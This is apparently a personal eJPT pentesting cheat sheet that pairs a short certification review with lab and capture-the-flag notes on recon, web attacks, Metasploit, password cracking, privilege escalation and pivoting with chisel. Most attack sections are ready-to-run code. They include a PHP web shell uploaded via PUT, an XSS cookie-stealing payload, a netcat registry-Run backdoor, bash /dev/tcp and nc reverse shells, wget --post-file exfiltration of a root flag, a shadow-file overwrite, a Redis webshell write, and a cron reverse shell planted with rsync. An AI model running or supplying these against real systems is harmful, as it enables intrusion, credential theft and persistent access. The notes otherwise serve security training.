# My Review

|Difficulty: ★☆☆☆☆|
|Price: ★★★★☆| $249 |
|Material: ★★☆☆☆|
|Real-World Scenario: ★☆☆☆☆|
|Worth it?: Yes, as a first cert|
|Official Site: [eJPT by INE](https://security.ine.com/certifications/ejpt-certification/)|

> This is eJPTv1, So I reckon that the material got better after the update

> If you have zero experience with Pentesting, start with **TryHackMe**.
Learn the basics then you are good to go!

# Gather information

on google:
```bash
site: <website>
```

DNSdumpster.com
VirusTotal
```bash
ctr.sh <certificate search>
```

on kali:
```bash
sublist3r -d <domain>
subbrute 

apt-get install snapd
service snapd start
snap install amass
snap run amass -ip -d <domain>
```

# PORT SCAN

```bash
fping -a -g <host> 2>/dev/null 
```
To get the ips that are UP, we can send to a file

Nmap can execute the scan with:
```bash
-iL <file>.
-sS - stealth scan 
-sT - tcp scan > generates logs
-sV - get versions > not as stealth but very useful
-O  - Try to get OS
-iL - get hosts by file
-Pn - assumes all hosts are ups and try to scan
-p  - port
-A  - More profound scan
```

We can go with:
```bash
-sV -T4 -p-  then -sV -T4 -p <the ports> -A > nmap.result
```

# VULNERABILITY SCAN

- OpenVAS
- Nexpose
- GFI LAN Guard
- Nessus

List of various vuln scans:
https://sectools.org/tag/vuln-scanners/


# Web Scan

## MANUAL FINGERPRINT
```bash
nc <target> 80
HEAD / HTTP/1.0
<space>
<space>
```

For https use openssl:
```bash
openssl s_client -connect <target>:443
HEAD / HTTP/1.0
```

```bash
httprint -P0 -h <target> -s <signature file>
-P0 - to avoid pinging the host
-h - target hosts
```

HTTP VERBS
PUT

to count in bytes how long your payload is:
```bash
wc -m payload.php
```

```bash
nc <target site> 80
PUT /payload.php hTTP/1.0
Content-Type: text/html
Content-lenght: 136 > value that we get with wc -m <payload>
```

```php
<?php phpinfo(); ?>
```

PHP shell code: to use with PUT method:
```php

<?php
if (isset($_GET['cmd']))
{
  $cmd = $_GET['cmd'];
  echo '<pre>';
  $result = shell_exec($cmd);
  echo $result;
  echo '</pre>';
}
?>
```

After uploading this shell, we can go to the browser and use:
```bash
"?cmd=<command>" 
```

## NC

we can send files using netcat also:
Receiver
```bash
nc -lvnp <port> > output_file.txt
```

Sender
```bash
echo 'hello' | nc -v <ip> <port>
or
cat <file_u_Wanna_send> | nc -v <ip> <port>
```

## Bind Shell with netcat:

in the server/listener:
```bash
nc -lvnp <port> -e /bin/bash
```

in the client/sender:
```bash
nc -v <ip> <port>
```

## Dictionary-based Enumeration
common backup file names are: .bak, .old, .txt and .xxx

## DIRB

```bash
-x <file of extensions>
-X "extensions.bak, extensions.xxx"
-z delay in miliseconds
-o output a file
-p proxy
-H "set a header"
-u basic authentication "user:password"
-c "set a cookie"
-a "set a agent user"
```

## XSS
reflective > can execute commands and get answer of output in the browser
stored > can send files to the server / get cookies for others users and steal sessions

find a user input field:
```bash
# try to execute a html command like 
<h1> teste </h1>

# try to execute JS command like 
<script>alert('XSS');</script>
```

payload to steal cookies: XSS Stored
we need to have a page to send the cookies, in this case we have get.php
but in  real scenario we gottta have a page set up to be able to do that.

```bash
<script>
var i = new Image();
i.src="http://192.168.99.11/get.php?cookies="+document.cookie; 
</script>
```

after that, we go to the ip 99.11 and get the file with the stolen cookie.


## MYSQL INJECTION

```bash
' or substr(user(), 1, 1) = 'a
' or substr(user(), 1, 1) = 'b
```

after finding the first letter

```bash
' or substr(user(), 2, 1) = 'a
```

- go to the second one.

- guessing the current user.


## SQLMap

```bash
sqlmap -u <URL> -p <injection parameter> [options]
```

example:

```bash
sqlmap -u 'vulnerable url' -p id --technique=U #using UNION
```

with POST:

```bash
sqlmap -u 'url' --data <post string> -p parameter [options] # u can get the post string with burp
```

```bash
-b - banner
--tables
--current-db <name>
--columns
--dump
-v3 --fresh-queries # to see what payload the sqlmap used
--dbs # to see the databases availables
--users # to see the users
-D # set the database of your choice
-T # set the tables of your choice
-C # set column of your choice
-r # request, we can get from burp
--technique=U # UNION attack
--technique=B # boolean-based attacks
--flush-session # if you need to clear the logs for a rerun test or smt like that #logs > /usr/share/sqlmap/output/
```

# System Atacks

## ncat 
```
-l  -listem
-e  -execute file
-p  -port
-v  -verbose
```

## backdoor

- copy ncat (with the right OS version) to the target
- as WIndows\system32\winconfig.exe
- go to regedit

```
HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

New > String Value
Edit with the path of the ncat as winconfig follow by the ip of attacker and port to connect

```bash
 -e cmd.exe
example: "C:\Windows\System32\winconfig.exe <IP> <PORT> -e cmd.exe"
```

```bash
# the persistence is set. 
# We can listen in our attacker machine 
ncat -l -p <port> -v
```

## METERPRETER
if u have a session already

to get persistence:
```
use exploit/windows/local/s4u_persistence
```

or
```
use exploit/windows/local/persistence
set payload, session, lhost and port 
set DisablePayloadHandler false
set start SYSTEM
```

then we are able to open a session even after the reboot with:
```
use exploit/multi/handler
set payload, lhost and port
```

with meterpreter we can:
```
- screenshot > to grab the screen of the target
```

```bash
# [in the attack machine] 
eog /path of the screenshoot
download <file> or  "/path"
upload <file> /path
sysinfo
ps #running proccess
whoami /priv
help #to see all commands
hashdump
search -f <file>
```

```bash
getuid #WINXP-ftp
getsystem >> this give us escalate privileges, now we are NT AUTHORITY\SYSTEM
getuid #AUTHORITY\SYSTEM
sysinfo
```


## JOHN
bruteforce:

```bash
--list=formats  #to see all formats available
```

after get the shadow and passwd files:
```bash
unshadow passwd shadow > crackme
```

```bash
john -incremental -users:victim crackme
john --show crackme #to see the result
```

dictionary:
```bash 
john -w=/<wordlist> <file>
-rules #to add mangling example PASSWORD in the wordlist, mangling = password, passw0rd etc
```


rainbow tables:
- tools: ophcrack #its used only for Windows


## HASHCAT
can use rules as well, to implement certain variations to the normal dictionaries;
example:

```bash 
password/p4ssw0rd/PAssWord!/123password etc

```

# NETWORK ATTACKS

```bash
Hydra -l -p <target> <service>

-l - fixed user
-L - wordlist for user
-p - fixed password
-P - wordlist for passwords

hydra <IP> <type: http-post-form> "<directory-of-login-page>:<user=^USER^&pass=^PASS^:<message of invalid credentials>" -l <user> -p <pwd> -f {to exit when find a valid login} -V {verbose, to show us the result}

```



# SHARES

## Windows:

unumerate windows shares:
```bash

nbtstat

nbtstat -A <IP> # most common, display information about the target
```

output:
```bash
Name - Type - Status
xx    - <00> is a workstation - Registered
xx    - <20> sharing is up and running- Regustered

NET VIEW <target IP>
```

## Linux:
```bash
nmblookup -A <target ip>

smbclient -L //<IP> -N 

-L = #to look which services are available
-N #to force to not ask For password
```


Checking 'for' NULL Sessions with Windows:
```bash
net use \\<IP>\IPC$ '' /u: ''
```

Checking 'for' NULL Sessions with Linux
```bash
smbclient \\\\<IP>\\IPC$ -N
```

## TOOLS

in Windows: 

enum:
```bash
enum -S <IP> # enumerate shares
enum -U <IP> # enumerate users
enum -P <IP> # check password policy
```

winfo:
```bash
winfo <IP> -n
```

in Linux:
enum4linux

```bash
samrdump <IP>
```

/usr/share/doc/python-impacket-doc/examples/

we can use nmap to enumerate the shares also:
```bash
nmap -script=smb-enum-shares <IP>
nmap -script=smb-enum-users <IP>
nmap -script=smb-brute <IP>


nmap --script smb-check-vulns.exe --script-args=unsafe=1 <IP>
```

> [!NOTE] This checks if the machine is vulnerable against well known vulnerabilties



# ARP

> [!NOTE] its a protocol to resolve ip address into mac address


First we need to enable IP Forwarding:

By enabling IP Forwarding, you tell your machine to forward the packets you intercept to the real destination host.

```bash
echo 1 > /proc/sys/net/ipv4/ip_forward
```

You can then run arpspoof:
```bash

arpspoof -i <interface> -t <target> -r <host>

example:

arpspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16
```

> [!NOTE] You can then run Wireshark and intercept the traffic!



# METERPRETER

Most used Payloads:

bind_tcp

- Runs a server process on the target machine that waits for connections from the attacker machine

reverse_tcp

- Performs a TCP connection back to the attacker machine. As you saw in the Backdoors chapter, this feature 
- help evade firewall rules

> We can use the getsystem to update our privilege, but in modern Windows that is not possible because of the User Account Control
> We can bypass that restriction by using the "bypassuac" 

- search bypassuac
```bash
use exploit/windows/local/bypassuac
set session <session that we want to update privileges>
```

> in the new meterpreter session, the UAC is disabled, so we can execute the command "getsystem"


- hashdump to dump the password databases and save it 'for' an offline cracking session;

```bash
use post/windows/gather/hashdump
set session <session number>
```


We can 'download' and 'upload' files:
```bash
'shell' > to run standard operating system shell

run post/windows/gather/win_privs = whoami /priv

ps
```

We can migrate to a process to be more stealth:
```bash
ps -U SYSTEM or whatever our privileges is;

migrate < PID >

getpid to see if it worked.

hashdump # to hash the pwd and shadow, but only works if we have SYSTEM privilege.
```

> get that and run john to crack


If we have a session already, we can upgrade to meterpreter session

by using:
```bash
post/multi/manage/shell_to_meterpreter
set session <number>
set lport and lhost
run

```


# Remote Code Executions

```bash
echo $PATH
# visit some of these locations and view what tools are there

# is netcat present?
which nc
# is python present?
which python
# is curl installed?
which curl
# is wget installed?
which wget
```

we can use these tools do get shell.

with netcat:
```bash
nc <IP> <port> -e /bin/bash
```

and listening in our kali
```bash
nc -lvnp <port>
```

## with CURL
In kali: 
```bash
nc -lvnp <port>
```

In target:
```bash
curl http://<our IP>:<port>
curl http://<our IP>:<port>/'whoami'
curl http://<our IP>:<port>/'id | base64'
curl http://<our IP>:<port>/file -T /etc/issue
```

We can try to upload a msfvenom payload to the machine.
msfvenom -p linux/x64/shell_reverse_tcp lhost=<our ip> lport=<port> -f elf -o <name>

```bash
curl http://<our IP>:<por>/<file> -o /tmp/r
chmod +x /tmp/r
/tmp/r # run after netcat is listening
```



# PrivEsc WgelCTF

user was able to use wget as SUDO...

1:
```bash
sudo wget --post-file /root/root.txt http://10.10.14.5:443/
```

> I sent the flag through **http.server**

2:
## Create shadow file
```bash
openssl passwd -1 -salt 0xdf password

sudo wget -O /etc/shadow http://10.10.14.5/shadow
su -
```

I did a file a shadow file and overwrote the actual shadow of the machine:
```bash
root:$1$0xdf$fKKvgEPPSu1HMdNI3w5i50:18195:0:99999:7:::
```

> so when the command **su -** is written, I get root access.

```bash
root@CorpOne:~# id
uid=0(root) gid=0(root) groups=0(root)
```

After open a python server to send a file:

grab with curl:
```bash
curl <ip:port>/linpeas.sh | bash or sh # this will execute directly
```

## Better shell

Discovery Web Content: dirb, gobuster, dirsearch
```bash
ffuf -u <url>/FUZZ -w <wordlist>
ffuf -u <url>/FUZZ-- -w <wordlist-special-chars> -mc 200,500 -fw 9
```


## GOBUSTER - WEB ENUMERATION

### try to find directories
```bash
gobuster dir -w /opt/Seclists/Discovery/Web-Content/raft-small-words.txt -x php -u <url> -o gobuster/dir-root.log
```

### try to find subdomains
```bash
gobuster vhost -w /opt/Seclists/Discovery/DNS/subdomains-topmillion-110000.txt -u <url> -o gobuster/vhist-sub.txt
```

> We can save the request of a login from burp/zap with copy to file. **request.req**

## SQLMAP
```bash
sqlmap -r <login.req> --batch
sqlmap -r <login.req> --batch --level 5 --risk 3
```

## GREP
```bash
cat <file> | grep -v <somethin> # show everything except lines with <something>
```

WITH LOGINS:

```
we can try to register 'admin<space>' 
sometimes the site register the same username of 'admin' and when we try to login
we have admin privileges to the web server
```



```bash
cat /etc/passwd | grep sh$ | awk -F '{print 1$}' # print all the usernames that finish with sh


poetry run CrackMapExec ssh <url> -u <users file> -p <pwd file>
```

zcap can read gzip files like a cat:
```bash
zcap access.log.*.gz | grep -iv 'a\|b\|c'
```

## AUREPORT

Can do a report upon the logs files.

example:
```bash
aureport --tty # to show terminals access 
```





# Pivot

**In kali**:

create a directory: /www

```bash
python3 -m http.server
nc -lvnp 8000 < {file we want to send}
```

**In target**:
 
```bash
curl <ip>:<port>/<file>	
wget http://<ip>:<port>/file
cat < /dev/tcp/<kali ip>/<port> # to get the output of the file
bash -c "cat < /dev/tcp/<kali ip>/<port>" # if the shell isnt bash, try to execute as bash
bash -c "cat < /dev/tcp/<kali ip>/<port> > /dev/shm/LinEnum.sh" # try to send to a file
bash -c "bash -i >& /dev/tcp/<kali ip>/<port> 0>&1" # to get reverse shell
```

- It works like fping -a -g - but sometimes the target does not have this option
```bash
for ip in $(seq 1 5); do ping -c 1 < x.x.x.$ip > /dev/null && echo "Online: x.x.x.$ip"; done
```

- nmap inside machine without nmap
```bash
for port in $(seq 1 65535); do (echo scan > /dev/tcp/<target ip>/$port && echo "Open: $port") 2>/dev/null; done
```


## PIVOT with CHISEL

**IN Kali**:
```bash
chisel server -p 8000 -reverse -v
```

after the handshake with the chisel server:
```bash
		curl localhost:8001
```

**In Target**:

```bash
chisel client <kali ip>:8000 R:8001:<target ip>:80 
# This will open port 8001 of our kali to send data through the tunneling network to port 80 of the target

chisel client <kali ip>:8000 R:8001:127.0.0.1:<target ip>:80 
# Its a bit more secure, cause we only can access though the localhost

chisel client <kali ip>:8000 R:127.0.0.1:6379:<target ip>:6379	
# We can access the 6379 port of the target in our machine by localhost:<port we just opened>

nmap -sT -p <port> -sC -sV localhost -oA nmap/name-u-want
```


We can visualize the open port with netstat:
```bash
netstat -alnp | grep 8001
```

## LOCAL PIVOT

**In Kali**:
```bash
chisel server -p 8000
```

**In target**:
```bash
chisel client <kali ip>:<port> 9001:127.0.0.1:8001
# this open the 9001 of the target and tunnel with our 8001 port

chisel client <kali ip>:<port> 9001:1< another target ip >:445
# to open a windows box through tunneling
```

```bash
telnet or nc localhost <port>
flushall
set AnyText "<? system($_REQUEST['cmd']); ?>"
config set dbfilename shell.php
config set dir /var/www/html/

Then we can open in the browser ip/shell.php?cmd=<command> 
# problably what we want is a reverse shell
# so we cam grab in pentest monkey
```


Do a CRONJOB in target:
```bash
echo "* * * * * root bash -c 'bash -i >& /dev/tcp/<kali ip>/<port> 0>&1'" > runme
```

send with rsync:
```bash
rsync -a runme rsync://backup:873/src/etc/cron.d/runme
```

We can send commands base64 encoded, if the shell of the target machine is not accepting out request;
```bash
bash -c 'bash -i >& /dev/tcp/<kali ip>/<port> 0>&1' | base64
```

get the output:
```bash
echo "* * * * * root bash -c 'output in base64 | base64 -d" > runme
```

## REVERSE SOCKS

**In Kali**:
```bash
chisel server -p 8000 -reverse -v
```

**In Target**:
```bash
chisel client <kali ip>:8000 R:8001:127.0.0.1:1337
chisel server -p 1337 --socks5
```

> Will redirect everything from our port 8001 to port 1337 of the target

**In Kali again**:
```bash
chisel client 127.0.0.1:8001 socks
```
